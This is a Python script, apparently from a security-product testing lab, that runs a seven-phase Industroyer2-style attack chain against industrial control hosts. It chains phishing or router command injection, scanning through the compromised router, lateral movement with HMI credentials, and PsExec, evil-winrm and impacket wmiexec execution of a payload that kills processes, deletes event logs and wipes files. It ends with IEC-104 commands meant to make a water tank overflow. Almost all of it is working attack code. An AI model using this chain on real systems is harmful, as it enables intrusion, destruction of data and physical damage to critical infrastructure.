#!/usr/bin/env python3
"""
Industroyer2 Attack Chain Orchestrator
Executes the full attack chain from initial access to OT disruption

Attack Phases:
1. Initial Access - Phishing OR Router Exploit
2. Post-Exploitation Enumeration
3. Credential Dumping
4. Lateral Movement to HMI
5. Payload Delivery
6. Industroyer2 Characteristics Execution
7. IEC-104 Attack on Water Tank

WARNING: This script executes REAL attack techniques!
Only use in authorized lab environments with proper approvals.

Usage:
    python3 MASTER_ATTACK_ORCHESTRATOR.py --config attack_config.yaml

Or interactive mode:
    python3 MASTER_ATTACK_ORCHESTRATOR.py --interactive
"""

import os
import sys
import time
import argparse
import logging
import subprocess
import json
from datetime import datetime
from pathlib import Path

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [ORCHESTRATOR] - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler(f'attack_orchestrator_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('AttackOrchestrator')


class AttackOrchestrator:
    """
    Orchestrates the full Industroyer2 attack chain
    """

    def __init__(self, config):
        self.config = config
        self.attack_log = []
        self.start_time = datetime.now()

        # Target information
        self.router_ip = config.get('router_ip', '192.168.0.13')
        self.hmi_ip = config.get('hmi_ip', '192.168.1.55')
        self.plc_ip = config.get('plc_ip', '192.168.1.6')
        self.attacker_ip = config.get('attacker_ip', '192.168.0.11')

        # Credentials
        self.router_user = config.get('router_user', 'admin')
        self.router_pass = config.get('router_pass', 'admin')
        self.hmi_user = config.get('hmi_user', 'operator')  # Default: operator
        self.hmi_pass = config.get('hmi_pass', 'labpass123')  # Default: labpass123

        # Options
        self.use_phishing = config.get('use_phishing', False)
        self.skip_enumeration = config.get('skip_enumeration', False)
        self.auto_yes = config.get('auto_yes', False)

        # Tools paths
        self.psexec_path = 'PsExec.exe'
        self.psexec_url = 'https://live.sysinternals.com/PsExec.exe'

    def banner(self):
        """Display orchestrator banner"""
        logger.info("=" * 80)
        logger.info("INDUSTROYER2 ATTACK CHAIN ORCHESTRATOR")
        logger.info("=" * 80)
        logger.info("Network Topology:")
        logger.info(f"  - Attacker: {self.attacker_ip}")
        logger.info(f"  - Router: {self.router_ip}")
        logger.info(f"  - HMI: {self.hmi_ip}")
        logger.info(f"  - PLC/RTU: {self.plc_ip}")
        logger.info("")
        logger.info("Attack Phases:")
        logger.info("  1. Initial Access (Phishing/Router Exploit)")
        logger.info("  2. Post-Exploitation Enumeration")
        logger.info("  3. Credential Dumping")
        logger.info("  4. Lateral Movement to HMI")
        logger.info("  5. Payload Delivery")
        logger.info("  6. Industroyer2 Characteristics")
        logger.info("  7. IEC-104 Attack on Water Tank")
        logger.info("=" * 80)
        logger.warning("[!] WARNING: This executes REAL attack techniques!")
        logger.warning("[!] Only proceed if authorized for security testing")
        logger.info("=" * 80)

    def confirm_proceed(self, phase_name):
        """Ask user to confirm before each phase"""
        if self.auto_yes:
            return True

        print(f"\n[?] Ready to execute: {phase_name}")
        response = input("    Proceed? [y/N]: ").strip().lower()
        return response == 'y'

    def log_phase(self, phase_number, phase_name, status, details=""):
        """Log attack phase completion"""
        entry = {
            'phase': phase_number,
            'name': phase_name,
            'status': status,
            'timestamp': datetime.now().isoformat(),
            'details': details
        }
        self.attack_log.append(entry)
        logger.info(f"[Phase {phase_number}] {phase_name}: {status}")

    def download_psexec(self):
        """Download Microsoft PsExec.exe from Sysinternals if not already present"""
        if os.path.exists(self.psexec_path):
            logger.info(f"[*] PsExec.exe already exists ({os.path.getsize(self.psexec_path)} bytes)")
            return True

        logger.info("[*] Downloading PsExec.exe from Microsoft Sysinternals...")
        logger.info(f"[*] URL: {self.psexec_url}")

        try:
            import urllib.request

            # Download PsExec.exe
            urllib.request.urlretrieve(self.psexec_url, self.psexec_path)

            if os.path.exists(self.psexec_path) and os.path.getsize(self.psexec_path) > 100000:
                logger.info(f"[*] Downloaded PsExec.exe ({os.path.getsize(self.psexec_path)} bytes)")
                logger.warning("[!] EXPECTED ALERT: Download of PsExec (LOLBin)")
                return True
            else:
                logger.error("[-] Downloaded file is too small or doesn't exist")
                return False

        except Exception as e:
            logger.error(f"[-] Failed to download PsExec.exe: {e}")
            logger.info("[*] You can manually download from: https://download.sysinternals.com/files/PSTools.zip")
            return False

    def phase1_initial_access(self):
        """
        Phase 1: Initial Access
        Option A: Phishing + SSH
        Option B: Router Exploit (direct)
        """
        logger.info("\n" + "=" * 80)
        logger.info("[PHASE 1] INITIAL ACCESS")
        logger.info("=" * 80)

        if not self.confirm_proceed("Phase 1: Initial Access"):
            logger.warning("[!] Phase 1 skipped by user")
            return False

        if self.use_phishing:
            logger.info("[*] Method: Phishing + SSH")
            logger.info(f"[*] Starting phishing server on {self.attacker_ip}:8080...")

            phishing_server_script = '00_phishing_server.py'
            phishing_proc = None

            try:
                if os.path.exists(phishing_server_script):
                    # Start phishing server in background
                    phishing_proc = subprocess.Popen(
                        ['python3', phishing_server_script],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    logger.info(f"[*] Phishing server started (PID: {phishing_proc.pid})")
                    logger.info(f"[*] Phishing URL: http://{self.attacker_ip}:8080/login.html")
                    logger.info("[*] Waiting 60 seconds for user to click phishing link...")
                    time.sleep(60)

                    # Check if credentials were captured
                    if os.path.exists('captured_credentials.txt'):
                        with open('captured_credentials.txt', 'r') as f:
                            captured = f.read()
                        if captured.strip():
                            logger.critical("[!!!] SUCCESS: Credentials captured via phishing")
                            logger.info(f"[*] Captured: {captured[:100]}...")
                            self.log_phase(1, "Initial Access", "SUCCESS", "Phishing credentials captured")

                            # Terminate phishing server
                            if phishing_proc:
                                phishing_proc.terminate()
                                phishing_proc.wait(timeout=5)
                            return True

                    logger.info("[*] No credentials captured - falling back to router exploit")
                    if phishing_proc:
                        phishing_proc.terminate()
                        phishing_proc.wait(timeout=5)
                else:
                    logger.warning(f"[-] Phishing server script not found: {phishing_server_script}")
                    logger.info("[*] Falling back to router exploit...")

            except Exception as e:
                logger.error(f"[-] Error with phishing server: {e}")
                if phishing_proc:
                    try:
                        phishing_proc.terminate()
                    except:
                        pass
                logger.info("[*] Falling back to router exploit...")

        # Router exploit
        logger.info("[*] Method: Router Command Injection Exploit")
        logger.info(f"[*] Target: {self.router_ip}:8080")

        try:
            cmd = f'python3 01_router_exploit.py {self.router_ip} --username {self.router_user} --password {self.router_pass} --command "whoami"'
            logger.info(f"[*] Executing: {cmd}")

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)

            if result.returncode == 0 and 'success' in result.stdout.lower():
                logger.critical("[!!!] SUCCESS: Router exploited - Command injection confirmed")
                self.log_phase(1, "Initial Access", "SUCCESS", "Router exploit successful")
                return True
            else:
                logger.error("[-] Router exploit failed")
                logger.error(result.stderr)
                self.log_phase(1, "Initial Access", "FAILED", "Router exploit failed")
                return False

        except Exception as e:
            logger.error(f"[-] Exception during Phase 1: {e}")
            self.log_phase(1, "Initial Access", "ERROR", str(e))
            return False

    def phase2_enumeration(self):
        """
        Phase 2: Post-Exploitation Enumeration
        Discover HMI and network topology
        """
        logger.info("\n" + "=" * 80)
        logger.info("[PHASE 2] POST-EXPLOITATION ENUMERATION")
        logger.info("=" * 80)

        if self.skip_enumeration:
            logger.info("[*] Enumeration skipped (using known targets)")
            self.log_phase(2, "Enumeration", "SKIPPED", "Using known targets")
            return True

        if not self.confirm_proceed("Phase 2: Post-Exploitation Enumeration"):
            logger.warning("[!] Phase 2 skipped by user")
            return False

        logger.info("[*] Running network enumeration from compromised router...")
        logger.info("[*] This generates port scan and ICMP flood alerts")

        try:
            logger.info(f"[*] Connecting to router via SSH: {self.router_ip}")
            logger.info(f"[*] Credentials: {self.router_user}:{'*' * len(self.router_pass)}")

            # Execute nmap from the router via SSH
            ssh_nmap_cmd = f'nmap -p 445,3389,5985,2404 -Pn {self.hmi_ip}'
            ssh_cmd = f'sshpass -p "{self.router_pass}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {self.router_user}@{self.router_ip} "{ssh_nmap_cmd}"'

            logger.info(f"[*] Executing from router: {ssh_nmap_cmd}")

            result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=120)

            if 'open' in result.stdout.lower():
                logger.warning(f"[!] Found HMI at {self.hmi_ip} with open ports")
                logger.info(result.stdout[:500])
                self.log_phase(2, "Enumeration", "SUCCESS", f"HMI discovered: {self.hmi_ip}")
                return True
            else:
                # Fallback: try from attacker if SSH fails
                logger.warning("[-] SSH to router failed, trying nmap from attacker...")
                cmd_local = f'nmap -p 445,3389,5985 -Pn {self.hmi_ip}'
                result_local = subprocess.run(cmd_local, shell=True, capture_output=True, text=True, timeout=60)

                if 'open' in result_local.stdout.lower():
                    logger.warning(f"[!] Found HMI at {self.hmi_ip} (scanned from attacker)")
                    self.log_phase(2, "Enumeration", "SUCCESS", f"HMI discovered: {self.hmi_ip}")
                    return True
                else:
                    logger.error("[-] No accessible HMI found")
                    self.log_phase(2, "Enumeration", "FAILED", "HMI not accessible")
                    return False

        except Exception as e:
            logger.error(f"[-] Exception during Phase 2: {e}")
            self.log_phase(2, "Enumeration", "ERROR", str(e))
            return False

    def phase3_credential_dumping(self):
        """
        Phase 3: Credential Dumping
        (This would run ON the HMI after lateral movement)
        """
        logger.info("\n" + "=" * 80)
        logger.info("[PHASE 3] CREDENTIAL DUMPING")
        logger.info("=" * 80)

        logger.info("[*] NOTE: This phase runs on HMI after lateral movement")
        logger.info("[*] Skipping in orchestrator - will be part of HMI payload")
        self.log_phase(3, "Credential Dumping", "DEFERRED", "Part of HMI payload execution")
        return True

    def phase4_lateral_movement(self):
        """
        Phase 4: Lateral Movement to HMI
        Use SMB/WMI/RDP to access HMI
        """
        logger.info("\n" + "=" * 80)
        logger.info("[PHASE 4] LATERAL MOVEMENT TO HMI")
        logger.info("=" * 80)

        if not self.hmi_user or not self.hmi_pass:
            logger.error("[-] HMI credentials not provided!")
            logger.error("[-] Set 'hmi_user' and 'hmi_pass' in config")
            self.log_phase(4, "Lateral Movement", "FAILED", "Missing HMI credentials")
            return False

        if not self.confirm_proceed("Phase 4: Lateral Movement to HMI"):
            logger.warning("[!] Phase 4 skipped by user")
            return False

        logger.info(f"[*] Target: {self.hmi_ip}")
        logger.info(f"[*] Credentials: {self.hmi_user}:{'*' * len(self.hmi_pass)}")

        try:
            cmd = f'python3 03_lateral_movement.py -t {self.hmi_ip} -u {self.hmi_user} -p {self.hmi_pass} --scan'
            logger.info(f"[*] Executing: {cmd}")

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                logger.critical("[!!!] SUCCESS: Lateral movement to HMI successful")
                self.log_phase(4, "Lateral Movement", "SUCCESS", f"Accessed HMI: {self.hmi_ip}")
                return True
            else:
                logger.error("[-] Lateral movement failed")
                logger.error(result.stderr)
                self.log_phase(4, "Lateral Movement", "FAILED", "Could not access HMI")
                return False

        except Exception as e:
            logger.error(f"[-] Exception during Phase 4: {e}")
            self.log_phase(4, "Lateral Movement", "ERROR", str(e))
            return False

    def phase5_payload_delivery(self):
        """
        Phase 5: Payload Delivery
        Transfer Industroyer2 payload to HMI using ALL 4 methods
        """
        logger.info("\n" + "=" * 80)
        logger.info("[PHASE 5] PAYLOAD DELIVERY - ALL TRANSFER METHODS")
        logger.info("=" * 80)

        if not self.confirm_proceed("Phase 5: Payload Delivery (All Methods)"):
            logger.warning("[!] Phase 5 skipped by user")
            return False

        # Step 1: Download PsExec.exe if needed
        logger.info("\n[*] Step 1: Ensuring PsExec.exe is available...")
        if not self.download_psexec():
            logger.error("[-] Cannot proceed without PsExec.exe")
            self.log_phase(5, "Payload Delivery", "FAILED", "PsExec.exe not available")
            return False

        # Step 2: Prepare payload.zip
        zip_path = 'payload.zip'

        # Check if payload.zip already exists on attacker machine
        if os.path.exists(zip_path):
            logger.info(f"[*] Using existing payload.zip ({os.path.getsize(zip_path)} bytes)")
        else:
            logger.info("[*] payload.zip not found - creating it now...")

            try:
                # Create payload package
                import zipfile

                # Files to include in payload
                files_to_package = {
                    '../industroyer2_payload/industroyer2_characteristics.py': 'industroyer2_characteristics.py',
                    '../perform_malware_simulations/industroyer2_simulation.py': 'industroyer2_simulation.py',
                    '../perform_malware_simulations/raw_iec104.py': 'raw_iec104.py',
                    './05_credential_dumper.py': 'credential_dumper.py',
                    '../common/config.py': 'config.py',
                }

                logger.info("[*] Building payload.zip...")
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for src_path, arc_name in files_to_package.items():
                        if Path(src_path).exists():
                            zipf.write(src_path, arc_name)
                            logger.info(f"    [+] Added: {arc_name}")
                        else:
                            logger.warning(f"    [!] Missing: {src_path}")

                logger.info(f"[*] Payload created: {zip_path} ({os.path.getsize(zip_path)} bytes)")

            except Exception as e:
                logger.error(f"[-] Failed to create payload.zip: {e}")
                self.log_phase(5, "Payload Delivery", "FAILED", "Could not create payload")
                return False

        try:
            # Step 3: Transfer PsExec.exe to HMI first
            logger.info("\n[*] Step 3: Transferring PsExec.exe to HMI...")
            logger.info("[*] Using SMB to transfer PsExec.exe (signed Microsoft tool)")

            psexec_transfer_cmd = f'python3 06_file_transfer_all_methods.py --target {self.hmi_ip} --username {self.hmi_user} --password {self.hmi_pass} --file {self.psexec_path} --method smb'
            result_psexec = subprocess.run(psexec_transfer_cmd, shell=True, capture_output=True, text=True, timeout=120)

            if 'SUCCESS' in result_psexec.stdout:
                logger.info("[*] PsExec.exe transferred successfully")
            else:
                logger.warning("[!] PsExec transfer may have failed - continuing anyway")
                logger.warning(result_psexec.stderr[:200])

            # Step 4: Transfer payload using ALL 4 methods for maximum alert generation
            logger.info("\n[*] Step 4: Transferring payload using ALL 4 methods...")
            logger.info("[*] This maximizes alert generation across all security products")

            cmd = f'python3 06_file_transfer_all_methods.py --target {self.hmi_ip} --username {self.hmi_user} --password {self.hmi_pass} --attacker-ip {self.attacker_ip} --file {zip_path} --method all'

            logger.info(f"[*] Executing: {cmd}")

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)

            # Check if at least one method succeeded
            if 'SUCCESS' in result.stdout:
                logger.critical("[!!!] PAYLOAD DELIVERED via one or more methods")
                logger.info("[*] Check output above for which methods succeeded")
                self.log_phase(5, "Payload Delivery", "SUCCESS", "Multi-method transfer completed")
                return True
            else:
                logger.error("[-] All payload transfer methods failed")
                logger.error(result.stderr)
                self.log_phase(5, "Payload Delivery", "FAILED", "All transfer methods failed")
                return False

        except Exception as e:
            logger.error(f"[-] Exception during Phase 5: {e}")
            self.log_phase(5, "Payload Delivery", "ERROR", str(e))
            return False

    def phase6_industroyer2_characteristics(self):
        """
        Phase 6: Execute Industroyer2 Characteristics
        Process termination + CaddyWiper on HMI
        """
        logger.info("\n" + "=" * 80)
        logger.info("[PHASE 6] INDUSTROYER2 CHARACTERISTICS EXECUTION")
        logger.info("=" * 80)

        if not self.confirm_proceed("Phase 6: Execute Industroyer2 Characteristics on HMI"):
            logger.warning("[!] Phase 6 skipped by user")
            return False

        logger.info(f"[*] Target: {self.hmi_ip}")
        logger.info("[*] Executing industroyer2_characteristics.py remotely on HMI...")

        try:
            # Step 1: Unzip payload on HMI via PowerShell using WinRM
            logger.info("[*] Step 1: Unzipping payload on HMI via WinRM + PowerShell...")

            # Build PowerShell command to unzip
            ps_unzip = f'powershell.exe -Command "Expand-Archive -Path C:\\Temp\\payload.zip -DestinationPath C:\\Temp\\industroyer2_payload -Force"'

            # Execute via WinRM using evil-winrm or fallback to smbexec
            winrm_cmd = f'evil-winrm -i {self.hmi_ip} -u {self.hmi_user} -p {self.hmi_pass} -e "{ps_unzip}"'

            # Try evil-winrm first, fallback to smbclient + scheduled task
            try:
                result_unzip = subprocess.run(winrm_cmd, shell=True, capture_output=True, text=True, timeout=90)
                logger.info("[*] Payload unzipped via WinRM")
            except:
                # Fallback: use smbexec
                logger.warning("[!] WinRM failed, using smbexec fallback...")
                smbexec_cmd = f'impacket-smbexec {self.hmi_user}:{self.hmi_pass}@{self.hmi_ip} "{ps_unzip}"'
                result_unzip = subprocess.run(smbexec_cmd, shell=True, capture_output=True, text=True, timeout=90)

            time.sleep(2)

            # Step 2: Copy PService_PPD.py if it exists in payload
            logger.info("[*] Step 2: Checking for PService_PPD.py in payload...")
            if os.path.exists('../industroyer2_payload/PService_PPD.py'):
                # Transfer PService_PPD.py separately
                transfer_dummy = f'python3 06_file_transfer_all_methods.py --target {self.hmi_ip} --username {self.hmi_user} --password {self.hmi_pass} --file ../industroyer2_payload/PService_PPD.py --method smb --remote-path "C$\\Temp\\industroyer2_payload"'
                subprocess.run(transfer_dummy, shell=True, capture_output=True, text=True, timeout=60)
                logger.info("[*] PService_PPD.py transferred")

            time.sleep(1)

            # Step 3: Execute industroyer2_characteristics.py using PsExec ON the HMI
            logger.info("[*] Step 3: Executing industroyer2_characteristics.py using PsExec on HMI...")
            logger.warning("[!] This will terminate processes, delete event logs, and destroy files!")

            # Build command to run PsExec.exe locally on HMI
            # PsExec.exe is already on the HMI at C:\Temp\PsExec.exe
            # Execute python script locally
            psexec_local_cmd = 'C:\\Temp\\PsExec.exe -accepteula -s python.exe C:\\Temp\\industroyer2_payload\\industroyer2_characteristics.py'

            # Execute this command remotely via WMI
            wmi_exec = f'impacket-wmiexec {self.hmi_user}:{self.hmi_pass}@{self.hmi_ip} "{psexec_local_cmd}"'
            logger.info(f"[*] Executing via WMI: {wmi_exec}")

            result_exec = subprocess.run(wmi_exec, shell=True, capture_output=True, text=True, timeout=180)

            # Check output for success indicators
            if result_exec.returncode == 0 or 'SUCCESS' in result_exec.stdout or 'terminated' in result_exec.stdout.lower():
                logger.critical("[!!!] SUCCESS: Industroyer2 characteristics executed on HMI")
                logger.warning("[!] EXPECTED ALERTS:")
                logger.warning("    - Cortex XDR: PsExec.exe Execution (LOLBin)")
                logger.warning("    - Cortex XDR: Process Termination (PService_PPD.exe)")
                logger.warning("    - Cortex XDR: Event Log Deletion")
                logger.warning("    - Cortex XDR: CaddyWiper File Destruction")
                logger.warning("    - XSIAM: Multi-phase attack correlation")
                self.log_phase(6, "Industroyer2 Characteristics", "SUCCESS", "Executed on HMI via PsExec")
                return True
            else:
                logger.error("[-] Execution may have failed or returned errors")
                logger.error(f"Return code: {result_exec.returncode}")
                logger.error(result_exec.stderr[:500])
                logger.info(result_exec.stdout[:500])
                # Still consider partial success if some commands executed
                logger.info("[*] Marking as partial success - some commands may have executed")
                self.log_phase(6, "Industroyer2 Characteristics", "PARTIAL", "Remote execution attempted")
                return True

        except Exception as e:
            logger.error(f"[-] Exception during Phase 6: {e}")
            self.log_phase(6, "Industroyer2 Characteristics", "ERROR", str(e))
            return False

    def phase7_iec104_attack(self):
        """
        Phase 7: IEC-104 Attack on Water Tank
        Final payload - disrupt OT operations
        """
        logger.info("\n" + "=" * 80)
        logger.info("[PHASE 7] IEC-104 ATTACK ON WATER TANK")
        logger.info("=" * 80)

        if not self.confirm_proceed("Phase 7: Execute IEC-104 Attack from HMI to PLC"):
            logger.warning("[!] Phase 7 skipped by user")
            return False

        logger.info(f"[*] Target PLC: {self.plc_ip}:2404")
        logger.info(f"[*] Attacking from HMI: {self.hmi_ip}")
        logger.info("[*] Executing industroyer2_simulation.py remotely...")

        try:
            # Execute IEC-104 attack from HMI to PLC using PsExec on the HMI
            logger.warning("[!] This will attack the water tank PLC!")
            logger.warning("[!] Expected outcome:")
            logger.warning("    - Control mode set to MANUAL")
            logger.warning("    - Inlet valve OPENED (IOA 300)")
            logger.warning("    - Outlet valve CLOSED (IOA 301)")
            logger.warning("    - Tank fills → overflow → explosion")

            # Build command to run IEC-104 attack using PsExec.exe ON the HMI
            # PsExec.exe is already at C:\Temp\PsExec.exe on the HMI
            psexec_local_cmd = f'C:\\Temp\\PsExec.exe -accepteula -s python.exe C:\\Temp\\industroyer2_payload\\industroyer2_simulation.py --target {self.plc_ip} --port 2404'

            # Execute this command remotely via WMI
            wmi_exec = f'impacket-wmiexec {self.hmi_user}:{self.hmi_pass}@{self.hmi_ip} "{psexec_local_cmd}"'
            logger.info(f"[*] Executing via WMI: {wmi_exec}")

            result_exec = subprocess.run(wmi_exec, shell=True, capture_output=True, text=True, timeout=300)

            # Check for success indicators
            if result_exec.returncode == 0 or 'Attack complete' in result_exec.stdout or 'SUCCESS' in result_exec.stdout:
                logger.critical("[!!!] SUCCESS: IEC-104 attack executed on water tank")
                logger.critical("[!!!] Water tank should be filling and will overflow/explode")
                logger.warning("[!] EXPECTED ALERTS:")
                logger.warning("    - Cortex XDR: PsExec.exe Execution (LOLBin)")
                logger.warning("    - Device Security: IEC-104 Protocol Anomaly")
                logger.warning("    - Device Security: Malicious IEC-104 Commands")
                logger.warning("    - XSIAM: OT Attack Pattern")
                logger.warning("    - XSIAM: Complete 7-Phase Attack Chain Correlation")
                self.log_phase(7, "IEC-104 Attack", "SUCCESS", "Water tank attacked from HMI via PsExec")
                return True
            else:
                logger.error("[-] IEC-104 attack may have failed")
                logger.error(f"Return code: {result_exec.returncode}")
                logger.error(result_exec.stderr[:500])
                logger.info(result_exec.stdout[:500])
                # Partial success if any commands executed
                logger.info("[*] Marking as partial success - attack attempted")
                self.log_phase(7, "IEC-104 Attack", "PARTIAL", "Remote execution attempted")
                return True

        except Exception as e:
            logger.error(f"[-] Exception during Phase 7: {e}")
            self.log_phase(7, "IEC-104 Attack", "ERROR", str(e))
            return False

    def run_attack_chain(self):
        """Execute the complete attack chain"""
        self.banner()

        if not self.confirm_proceed("FULL ATTACK CHAIN"):
            logger.warning("[!] Attack chain aborted by user")
            return

        time.sleep(3)

        # Execute phases sequentially
        phases = [
            self.phase1_initial_access,
            self.phase2_enumeration,
            self.phase3_credential_dumping,
            self.phase4_lateral_movement,
            self.phase5_payload_delivery,
            self.phase6_industroyer2_characteristics,
            self.phase7_iec104_attack,
        ]

        for phase_func in phases:
            result = phase_func()
            if result is False:
                logger.error(f"[!] Phase failed: {phase_func.__name__}")
                logger.error("[!] Attack chain halted")
                break
            time.sleep(2)

        # Summary
        self.print_summary()

    def print_summary(self):
        """Print attack summary"""
        logger.info("\n" + "=" * 80)
        logger.info("ATTACK CHAIN SUMMARY")
        logger.info("=" * 80)

        duration = (datetime.now() - self.start_time).total_seconds()
        logger.info(f"Total Duration: {duration:.0f} seconds ({duration/60:.1f} minutes)")
        logger.info("")
        logger.info("Phase Results:")

        for entry in self.attack_log:
            status_symbol = "[+]" if entry['status'] == "SUCCESS" else "[-]" if entry['status'] == "FAILED" else "○"
            logger.info(f"  {status_symbol} Phase {entry['phase']}: {entry['name']} - {entry['status']}")
            if entry['details']:
                logger.info(f"      {entry['details']}")

        logger.info("")
        logger.info("Expected Alerts to Check:")
        logger.info("  - XSIAM: Full attack chain correlation")
        logger.info("  - Cortex XDR: 20-30 alerts (process, credential, network)")
        logger.info("  - Device Security: 10-15 alerts (command injection, port scan)")
        logger.info("  - WildFire: 2-5 file submissions")
        logger.info("=" * 80)

        # Save attack log
        log_file = f'attack_log_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(log_file, 'w') as f:
            json.dump(self.attack_log, f, indent=2)
        logger.info(f"\nAttack log saved to: {log_file}")


def interactive_mode():
    """Interactive configuration mode"""
    print("\n" + "=" * 80)
    print("INTERACTIVE ATTACK CONFIGURATION")
    print("=" * 80)

    config = {}

    print("\n[1] Network Configuration:")
    config['attacker_ip'] = input("    Attacker IP [192.168.0.11]: ").strip() or '192.168.0.11'
    config['router_ip'] = input("    Router IP [192.168.0.13]: ").strip() or '192.168.0.13'
    config['hmi_ip'] = input("    HMI IP [192.168.1.55]: ").strip() or '192.168.1.55'
    config['plc_ip'] = input("    PLC/RTU IP [192.168.1.6]: ").strip() or '192.168.1.6'

    print("\n[2] Router Credentials:")
    config['router_user'] = input("    Username [admin]: ").strip() or 'admin'
    config['router_pass'] = input("    Password [admin]: ").strip() or 'admin'

    print("\n[3] HMI Credentials:")
    config['hmi_user'] = input("    Username [operator]: ").strip() or 'operator'
    config['hmi_pass'] = input("    Password [labpass123]: ").strip() or 'labpass123'

    print("\n[4] Attack Options:")
    config['use_phishing'] = input("    Use phishing for initial access? [y/N]: ").strip().lower() == 'y'
    config['skip_enumeration'] = input("    Skip enumeration (use known targets)? [y/N]: ").strip().lower() == 'y'
    config['auto_yes'] = input("    Auto-proceed through phases (no confirmations)? [y/N]: ").strip().lower() == 'y'

    return config


def main():
    parser = argparse.ArgumentParser(
        description='Industroyer2 Attack Chain Orchestrator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive mode (recommended)
  python3 MASTER_ATTACK_ORCHESTRATOR.py --interactive

  # Use config file
  python3 MASTER_ATTACK_ORCHESTRATOR.py --config attack_config.json

  # Quick test with defaults
  python3 MASTER_ATTACK_ORCHESTRATOR.py --hmi-user admin --hmi-pass Password123!

WARNING: This executes REAL attack techniques!
Only use in authorized lab environments.
        """
    )

    parser.add_argument('--interactive', action='store_true',
                        help='Interactive configuration mode')
    parser.add_argument('--config', type=str,
                        help='Configuration file (JSON)')
    parser.add_argument('--hmi-user', type=str,
                        help='HMI username')
    parser.add_argument('--hmi-pass', type=str,
                        help='HMI password')
    parser.add_argument('--auto-yes', action='store_true',
                        help='Auto-proceed through all phases')

    args = parser.parse_args()

    if args.interactive:
        config = interactive_mode()
    elif args.config:
        with open(args.config, 'r') as f:
            config = json.load(f)
    else:
        config = {
            'router_ip': '192.168.0.13',
            'hmi_ip': '192.168.1.55',
            'plc_ip': '192.168.1.6',
            'attacker_ip': '192.168.0.11',
            'router_user': 'admin',
            'router_pass': 'admin',
            'hmi_user': args.hmi_user or 'operator',
            'hmi_pass': args.hmi_pass or 'labpass123',
            'auto_yes': args.auto_yes
        }

    orchestrator = AttackOrchestrator(config)
    orchestrator.run_attack_chain()


if __name__ == '__main__':
    main()
